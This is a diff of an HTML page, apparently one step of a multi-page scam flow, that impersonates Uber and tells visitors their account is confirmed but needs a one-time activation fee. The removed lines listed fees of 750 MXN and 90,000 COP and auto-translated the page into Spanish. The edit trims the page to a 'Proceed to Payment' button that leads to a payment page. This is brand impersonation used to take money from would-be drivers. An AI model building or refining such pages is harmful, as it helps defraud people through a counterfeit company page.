@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Account Activation Pending Payment</title>
+    <title>Account Activation Required</title>
     <style>
         body, html {
             margin: 0;
@@ -11,49 +11,32 @@
             background-color: white;
             font-family: Arial, sans-serif;
             height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
         .top-bar {
             background-color: black;
-            height: 1.5cm;
             width: 100%;
-            display: flex;
-            align-items: center;
-            padding: 0 20px;
-            box-sizing: border-box;
-        }
-        .top-bar h1 {
+            padding: 15px 0;
             color: white;
             font-size: 2rem;
-            font-weight: 500;
-            margin: 0;
+            font-weight: bold;
+            text-align: center;
+            position: fixed;
+            top: 0;
+            left: 0;
         }
         .content {
-            text-align: center;
+            max-width: 600px;
+            padding: 100px 20px 20px;
             font-size: 1.5rem;
             color: black;
-            padding: 20px;
+            text-align: center;
+            margin-top: 60px;
         }
-        .confirmation-message {
-            font-size: 2rem;
-            font-weight: bold;
-            color: green;
-            margin: 20px 0;
-        }
-        .instructions {
-            font-size: 1.2rem;
-            margin: 20px 0;
-            color: black;
-        }
-        .payment-details {
-            font-size: 1.2rem;
-            margin: 20px auto;
-            color: black;
-            line-height: 1.8;
-            text-align: left;
-            max-width: 400px;
-        }
-        .activation-button {
-            margin: 20px 10px 0;
+        .proceed-button {
+            margin-top: 20px;
             background-color: black;
             color: white;
             padding: 15px 30px;
@@ -62,83 +45,22 @@
             border-radius: 5px;
             cursor: pointer;
         }
-        .activation-button:hover {
-            background-color: #555;
-        }
-        .footer {
-            margin-top: 50px;
-            padding: 20px;
-            background-color: #f2f2f2;
-            color: #808080;
-            text-align: left;
-            font-size: 1rem;
-            width: 100%;
+        .proceed-button:hover {
+            background-color: #333;
         }
     </style>
 </head>
 <body>
-    <div class="top-bar">
-        <h1>Uber</h1>
-    </div>
+    <div class="top-bar">Uber</div>
     <div class="content">
-        <h2 id="accountVerifiedTitle">Account Activation Pending Payment</h2>
-        <p class="confirmation-message" id="confirmationMessage">
-            Your account has been reviewed and is ready to be activated.
-        </p>
-        <p class="instructions" id="instructionsMessage">
-            However, a payment is required to complete the activation process.
-        </p>
-        <div class="payment-details" id="paymentDetails">
-            <p><strong>Mexico Payment Details:</strong></p>
-            <p>Account Activation Payment: 600 MXN</p>
-            <p>Service Fee: 150 MXN</p>
-            <p><strong>Total Payment: 750 MXN</strong></p>
-            <hr>
-            <p><strong>Colombia Payment Details:</strong></p>
-            <p>Account Activation Payment: 60,000 COP</p>
-            <p>Service Fee: 30,000 COP</p>
-            <p><strong>Total Payment: 90,000 COP</strong></p>
-        </div>
-        <button class="activation-button" onclick="redirectToPayment()">Confirm</button>
-        <button class="activation-button" style="background-color: red;" onclick="cancelActivation()">Cancel</button>
+        <h2>Account Confirmed</h2>
+        <p>Your account has been confirmed. A one-time activation fee is required to complete the process.</p>
+        <button class="proceed-button" onclick="redirectToPayment()">Proceed to Payment</button>
     </div>
-    <div class="footer">
-        By proceeding, you consent to receiving calls, WhatsApp, or SMS/RCS messages, including by automated means, from Uber and its affiliates to the number provided.
-    </div>
+
     <script>
-        // Language Auto-detection
-        const userLang = navigator.language || navigator.userLanguage; 
-        const accountVerifiedTitle = document.getElementById("accountVerifiedTitle");
-        const confirmationMessage = document.getElementById("confirmationMessage");
-        const instructionsMessage = document.getElementById("instructionsMessage");
-        const paymentDetails = document.getElementById("paymentDetails");
-
-        if (userLang.includes('es')) {
-            // Spanish Translation
-            accountVerifiedTitle.textContent = "Pago Pendiente de Activación de Cuenta";
-            confirmationMessage.textContent = "Tu cuenta ha sido revisada y está lista para ser activada.";
-            instructionsMessage.textContent = "Sin embargo, se requiere un pago para completar el proceso de activación.";
-            paymentDetails.innerHTML = `
-                <p><strong>Detalles de Pago para México:</strong></p>
-                <p>Pago de Activación de Cuenta: 600 MXN</p>
-                <p>Tarifa de Servicio: 150 MXN</p>
-                <p><strong>Pago Total: 750 MXN</strong></p>
-                <hr>
-                <p><strong>Detalles de Pago para Colombia:</strong></p>
-                <p>Pago de Activación de Cuenta: 60,000 COP</p>
-                <p>Tarifa de Servicio: 30,000 COP</p>
-                <p><strong>Pago Total: 90,000 COP</strong></p>
-            `;
-        }
-
-        // Redirect to payment page
         function redirectToPayment() {
-            window.location.href = "3.html"; // Replace with the actual URL of your payment page
-        }
-
-        // Cancel activation process
-        function cancelActivation() {
-            alert("The activation process has been canceled.");
+            window.location.href = "3.html"; // Link to the payment details page
         }
     </script>
 </body>
